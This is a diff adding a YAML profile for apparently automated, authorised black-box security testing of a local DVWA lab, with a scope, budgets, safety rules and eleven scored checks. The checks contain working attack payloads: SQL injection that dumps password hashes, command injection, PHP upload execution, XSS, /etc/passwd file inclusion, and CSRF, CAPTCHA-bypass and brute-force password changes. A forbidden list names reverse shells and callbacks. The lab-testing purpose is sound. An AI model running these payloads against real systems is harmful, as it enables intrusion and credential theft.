@@ -1,0 +1,552 @@
+# Black-box profile — DVWA (Low)
+# Parseable without target source. Public page routes, documented demo accounts and the
+# pack CONTEXT contract only; nothing here is derived from reading DVWA source.
+schema: sak.blackbox.profile.v1
+target:
+  id: dvwa
+  name: Damn Vulnerable Web Application (Low security)
+  kind: web-application
+  base_url: http://127.0.0.1:8080
+  alternate_urls:
+    - http://localhost:8080
+  upstream: https://github.com/digininja/DVWA
+  image: vulnerables/web-dvwa
+  revision: lab image (not source-pinned; the black-box run never reads source)
+  security_level: low
+  authorized: true
+  transport: loopback-docker
+  health:
+    path: /login.php
+    method: GET
+    expect_status: 200
+    expect_text: Damn Vulnerable Web Application
+
+accounts:
+  - id: dvwa-admin
+    role: admin
+    username: admin
+    password_env: DVWA_PASSWORD
+    lab_default: password
+    notes: Documented DVWA demo account. Lab only; never a real credential.
+
+auth:
+  login:
+    method: POST
+    path: /login.php
+    content_type: application/x-www-form-urlencoded
+    fields:
+      username: username
+      password: password
+      Login: Submit
+    success:
+      status: 302
+      location_contains: index.php
+      body_contains: Logout
+  csrf:
+    required: true
+    field: user_token
+    selector: 'input[name="user_token"]'
+    source: /login.php
+    scope: per-form
+    notes: Re-extract the token for every state-changing form; do not reuse across forms.
+  session:
+    type: cookie
+    cookie: PHPSESSID
+    jar_env: DVWA_COOKIE_JAR
+    jar_default: runs/blackbox-dvwa-<timestamp>/.cookies.txt
+    post_login_check: /index.php contains Logout
+  setup:
+    - id: set-security-low
+      method: POST
+      path: /security.php
+      fields:
+        security: low
+        seclev_submit: Submit
+      csrf: true
+      expect_text: Security Level
+  logout:
+    method: GET
+    path: /logout.php
+
+scope:
+  allowed_hosts:
+    - 127.0.0.1:8080
+    - localhost:8080
+  schemes:
+    - http
+  path_prefixes:
+    - /login.php
+    - /index.php
+    - /security.php
+    - /logout.php
+    - /vulnerabilities/
+    - /hackable/
+    - /setup.php
+  out_of_scope:
+    - Any non-loopback host or port other than 8080
+    - Internet-facing DVWA instances
+    - Host filesystem paths outside the lab-created upload marker
+  requires_scope_file: true
+  scope_file: runs/blackbox-dvwa-<timestamp>/scope.md
+
+budget:
+  max_requests: 400
+  max_seconds: 900
+  max_agents: 2
+  max_concurrency: 2
+  waves: 2
+  stop_after_waves_without_signal: 2
+  per_check_timeout_seconds: 60
+  brute_force_max_requests: 10
+
+# The rubric is the coverage denominator: 11 expected issues, one stable id each.
+expected:
+  - id: DVWA-SQLI-01
+    title: SQL injection exposes credentials and data
+    class: sql-injection
+    cwe: CWE-89
+    method: GET
+    endpoint: /vulnerabilities/sqli/?id=1&Submit=Submit
+    proof: >-
+      A benign UNION SELECT on the id parameter returns rows from the users table
+      (user plus password hash), or a boolean pair (id=1 vs id=1') changes the result
+      set. Record both responses and mask the hash in the report.
+    severity: high
+    intrusive: false
+    destructive: false
+    approval: none
+    default: true
+    evidence: [paired request/response, returned user rows, boolean differential]
+    cleanup: none
+
+  - id: DVWA-CMDI-01
+    title: Command injection on the ping page
+    class: command-injection
+    cwe: CWE-78
+    method: POST
+    endpoint: /vulnerabilities/exec/
+    proof: >-
+      Submitting 127.0.0.1; id returns the uid/gid of the web user in addition to the
+      ping output. Benign read-only command only.
+    severity: high
+    intrusive: true
+    destructive: false
+    approval: profile
+    default: true
+    evidence: [request body, combined output containing uid=, web-user identity]
+    cleanup: none
+
+  - id: DVWA-UPLOAD-01
+    title: Unrestricted PHP upload leads to code execution
+    class: unrestricted-upload
+    cwe: CWE-434
+    method: POST
+    endpoint: /vulnerabilities/upload/
+    proof: >-
+      A lab-created file sak-marker-<timestamp>.php containing a marker echo is accepted
+      and GET /hackable/uploads/sak-marker-<timestamp>.php returns the marker, proving
+      server-side PHP execution.
+    severity: critical
+    intrusive: true
+    destructive: false
+    approval: profile
+    default: true
+    evidence: [upload response, stored path, marker response body]
+    cleanup: Delete the lab-created marker file from /hackable/uploads/.
+
+  - id: DVWA-XSS-R-01
+    title: Reflected XSS in the name parameter
+    class: xss-reflected
+    cwe: CWE-79
+    method: GET
+    endpoint: /vulnerabilities/xss_r/?name=test
+    proof: >-
+      The benign payload <script>alert(document.domain)</script> appears unencoded in the
+      response and fires in a browser context; capture the dialog or a DOM sink.
+    severity: medium
+    intrusive: false
+    destructive: false
+    approval: none
+    default: true
+    evidence: [raw response showing unencoded payload, browser dialog or DOM snapshot]
+    cleanup: none
+
+  - id: DVWA-XSS-S-01
+    title: Stored XSS in the guestbook
+    class: xss-stored
+    cwe: CWE-79
+    method: POST
+    endpoint: /vulnerabilities/xss_s/
+    proof: >-
+      A benign marker payload submitted as name/message is stored and executes on reload
+      in a fresh browser context. Marker text is unique to the run.
+    severity: high
+    intrusive: true
+    destructive: false
+    approval: profile
+    default: true
+    evidence: [submitted fields, stored page source, second-context dialog]
+    cleanup: Delete only the run-marker guestbook row; leave other rows intact.
+
+  - id: DVWA-CSRF-01
+    title: Password change without a CSRF token
+    class: csrf
+    cwe: CWE-352
+    method: GET
+    endpoint: /vulnerabilities/csrf/?password_new=x&password_conf=x&Change=Change
+    proof: >-
+      A tokenless request from the authenticated session changes the lab password and the
+      response says the password changed; confirm by logging in with the temporary value,
+      then restore the documented default.
+    severity: high
+    intrusive: true
+    destructive: false
+    approval: profile
+    default: true
+    evidence: [tokenless request, success response, temporary-login proof, restore proof]
+    cleanup: Restore the documented lab password and verify login.
+
+  - id: DVWA-FI-01
+    title: Local file inclusion reads arbitrary files
+    class: file-inclusion
+    cwe: CWE-98
+    method: GET
+    endpoint: /vulnerabilities/fi/?page=include.php
+    proof: >-
+      page=../../../../etc/passwd returns a passwd-style line (root:x:0:0) instead of the
+      default include; include the exact traversal used.
+    severity: high
+    intrusive: false
+    destructive: false
+    approval: none
+    default: true
+    evidence: [baseline include response, traversal response containing root:x:0:0]
+    cleanup: none
+
+  - id: DVWA-BRUTE-01
+    title: Brute force with no lockout
+    class: brute-force
+    cwe: CWE-307
+    method: GET
+    endpoint: /vulnerabilities/brute/?username=admin&password=x&Login=Login
+    proof: >-
+      A small documented credential list (at most brute_force_max_requests) reaches the
+      protected area for the valid lab password and no lockout or delay appears.
+    severity: medium
+    intrusive: true
+    destructive: false
+    approval: owner
+    default: false
+    evidence: [request count, responses for invalid vs valid password, timing observation]
+    cleanup: none
+
+  - id: DVWA-SESSION-01
+    title: Predictable session identifiers
+    class: session-management
+    cwe: CWE-330
+    method: GET
+    endpoint: /vulnerabilities/weak_id/
+    proof: >-
+      The dvwaSession value returned by the weak-id page increments predictably across
+      requests instead of using a random identifier.
+    severity: medium
+    intrusive: false
+    destructive: false
+    approval: none
+    default: true
+    evidence: [two or more ordered cookie values, increment observation]
+    cleanup: none
+
+  - id: DVWA-CSP-01
+    title: CSP page still executes injected inline script
+    class: csp-bypass
+    cwe: CWE-693
+    method: GET
+    endpoint: /vulnerabilities/csp/?include=include.php
+    proof: >-
+      The response Content-Security-Policy header allows the injected inline script and
+      <script>alert(document.domain)</script> executes despite the CSP page.
+    severity: medium
+    intrusive: false
+    destructive: false
+    approval: none
+    default: true
+    evidence: [CSP header, injected response body, browser dialog]
+    cleanup: none
+
+  - id: DVWA-CAPTCHA-01
+    title: CAPTCHA step can be skipped
+    class: captcha-bypass
+    cwe: CWE-804
+    method: POST
+    endpoint: /vulnerabilities/captcha/
+    proof: >-
+      Reaching step=2 directly, or reusing a solved CAPTCHA, changes the lab password
+      without a fresh correct challenge; confirm by login and restore the default.
+    severity: medium
+    intrusive: true
+    destructive: false
+    approval: profile
+    default: true
+    evidence: [step sequence, bypass response, temporary-login proof, restore proof]
+    cleanup: Restore the documented lab password and verify login.
+
+safety:
+  intrusive_requires_approval: true
+  intrusive_approved_in_profile: true
+  owner_approval_required_for:
+    - DVWA-BRUTE-01
+  destructive_default: false
+  denial_of_service: false
+  brute_force_default: false
+  allowed_payloads:
+    - <script>alert(document.domain)</script>
+    - Benign PHP marker file with a unique run prefix
+    - Read-only SQL UNION SELECT and boolean expressions
+    - id, whoami and hostname commands
+  forbidden:
+    - DROP, DELETE, TRUNCATE or UPDATE against non-marker rows
+    - Reverse shells, bind shells or outbound callbacks
+    - Denial of service, large payloads or parallel brute force
+    - Real credentials, tokens or third-party data
+  accounts_are_lab_only: true
+  cookies_and_passwords_in_ignored_run_files: true
+  mask_in_reports: [session cookies, CSRF tokens, password hashes, temporary passwords]
+  cleanup_only_lab_created_objects: true
+
+# Explicit live checks for the Low-security lab.  Every check is bounded, uses the
+# documented demo account, and writes sanitized evidence under the run directory.
+exploit:
+  mask:
+    - regex: '([a-f0-9]{32})'
+      replace: '***'
+    - regex: '(?i)(PHPSESSID=)[^;\s]+'
+      replace: '\1***'
+    - regex: '(?i)(dvwaSession=)[^;\s]+'
+      replace: '\1***'
+    - regex: '(?i)(_new=)[^&\s]+'
+      replace: '\1***'
+    - regex: '(?i)(_conf=)[^&\s]+'
+      replace: '\1***'
+    - regex: '(?i)(SakCsrf)[^\s&"<]+'
+      replace: '\1***'
+    - regex: '(?i)(SakCaptcha)[^\s&"<]+'
+      replace: '\1***'
+  checks:
+    - id: DVWA-SQLI-01
+      action: sql_injection
+      account: dvwa-admin
+      method: GET
+      path: /vulnerabilities/sqli/
+      param: id
+      baseline: "1"
+      payload: "1' UNION SELECT user, password FROM users-- -"
+      submit_field: Submit
+      submit_value: Submit
+      proof_regex: '(?is)admin.{0,160}[a-f0-9]{32}'
+      proof: a UNION payload returns the admin row and password hash
+
+    - id: DVWA-CMDI-01
+      action: command_injection
+      account: dvwa-admin
+      csrf: false
+      method: POST
+      path: /vulnerabilities/exec/
+      field: ip
+      payload: "127.0.0.1; id"
+      proof_regex: 'uid=.*gid='
+      proof: the semicolon payload appends id output to the ping result
+
+    - id: DVWA-UPLOAD-01
+      action: file_upload_rce
+      account: dvwa-admin
+      csrf: false
+      upload_path: /vulnerabilities/upload/
+      fields:
+        Upload: Upload
+      file:
+        field: uploaded
+        name: sak-dvwa-${run_marker}.php
+        content: "<?php echo 'SAK-UPLOAD-MARKER'; ?>"
+        content_type: application/x-php
+      fetch_path: /hackable/uploads/sak-dvwa-${run_marker}.php
+      proof_contains: SAK-UPLOAD-MARKER
+      proof: an uploaded PHP marker is served and executed
+
+    - id: DVWA-XSS-R-01
+      action: reflected_xss
+      account: dvwa-admin
+      method: GET
+      path: /vulnerabilities/xss_r/
+      param: name
+      payload: '<script>alert(document.domain)</script>'
+      submit_field: Submit
+      submit_value: Submit
+      proof: the payload is reflected unencoded in the response
+
+    - id: DVWA-XSS-S-01
+      action: stored_xss
+      account: dvwa-admin
+      csrf: false
+      method: POST
+      path: /vulnerabilities/xss_s/
+      display_path: /vulnerabilities/xss_s/
+      fields:
+        txtName: sak-${run_marker}
+        mtxMessage: '<script>alert(document.domain)</script>'
+        btnSign: Sign Guestbook
+      marker: sak-${run_marker}
+      proof: the stored marker and raw script are rendered on reload
+      cleanup: The guestbook entry is lab-created; reset the DVWA database to remove it.
+
+    - id: DVWA-CSRF-01
+      action: sequence
+      proof: a tokenless GET changes the admin password and a fresh login proves it
+      steps:
+        - action: request
+          account: dvwa-admin
+          method: GET
+          path: /vulnerabilities/csrf/
+          params:
+            password_new: SakCsrf${run_marker}!
+            password_conf: SakCsrf${run_marker}!
+            Change: Change
+          expect:
+            status: 200
+            contains: Password Changed
+        - action: request
+          method: POST
+          path: /login.php
+          with_csrf: true
+          token_source: /login.php
+          form:
+            username: admin
+            password: SakCsrf${run_marker}!
+            Login: Submit
+          expect:
+            status: 200
+            contains: Logout
+        - action: request
+          account: dvwa-admin
+          method: GET
+          path: /vulnerabilities/csrf/
+          params:
+            password_new: password
+            password_conf: password
+            Change: Change
+          expect:
+            status: 200
+            contains: Password Changed
+        - action: login
+          account: dvwa-admin
+      cleanup: Restore the documented demo password; the final login proves it.
+
+    - id: DVWA-FI-01
+      action: request
+      account: dvwa-admin
+      method: GET
+      path: /vulnerabilities/fi/
+      params:
+        page: /etc/passwd
+      expect:
+        status: 200
+        regex: root:x:0:0
+      proof: the page parameter includes an absolute host file
+
+    - id: DVWA-BRUTE-01
+      action: sequence
+      proof: a wrong password is rejected and the demo password is accepted without lockout
+      steps:
+        - action: request
+          account: dvwa-admin
+          method: GET
+          path: /vulnerabilities/brute/
+          params:
+            username: admin
+            password: not-the-password
+            Login: Login
+          expect:
+            status: 200
+            contains: Username and/or password incorrect
+        - action: request
+          account: dvwa-admin
+          method: GET
+          path: /vulnerabilities/brute/
+          params:
+            username: admin
+            password: password
+            Login: Login
+          expect:
+            status: 200
+            contains: Welcome to the password protected area
+
+    - id: DVWA-SESSION-01
+      action: weak_session
+      account: dvwa-admin
+      path: /vulnerabilities/weak_id/
+      cookie: dvwaSession
+      proof: two POSTs set a numeric session cookie that increments by one
+
+    - id: DVWA-CSP-01
+      action: sequence
+      proof: the CSP page reflects an injected script and still returns a CSP header
+      steps:
+        - action: request
+          account: dvwa-admin
+          method: GET
+          path: /vulnerabilities/csp/
+          expect:
+            status: 200
+            header: Content-Security-Policy
+        - action: request
+          account: dvwa-admin
+          method: POST
+          path: /vulnerabilities/csp/
+          form:
+            include: <script>alert(document.domain)</script>
+          expect:
+            status: 200
+            header: Content-Security-Policy
+            contains: <script>alert(document.domain)</script>
+
+    - id: DVWA-CAPTCHA-01
+      action: sequence
+      proof: the step-2 POST skips the CAPTCHA and a fresh login proves the new password
+      steps:
+        - action: request
+          account: dvwa-admin
+          method: POST
+          path: /vulnerabilities/captcha/
+          form:
+            step: "2"
+            password_new: SakCaptcha${run_marker}!
+            password_conf: SakCaptcha${run_marker}!
+            Change: Change
+          expect:
+            status: 200
+        - action: request
+          method: POST
+          path: /login.php
+          with_csrf: true
+          token_source: /login.php
+          form:
+            username: admin
+            password: SakCaptcha${run_marker}!
+            Login: Submit
+          expect:
+            status: 200
+            contains: Logout
+        - action: request
+          account: dvwa-admin
+          method: GET
+          path: /vulnerabilities/csrf/
+          params:
+            password_new: password
+            password_conf: password
+            Change: Change
+          expect:
+            status: 200
+            contains: Password Changed
+        - action: login
+          account: dvwa-admin
+      cleanup: Restore the documented demo password; the final login proves it.
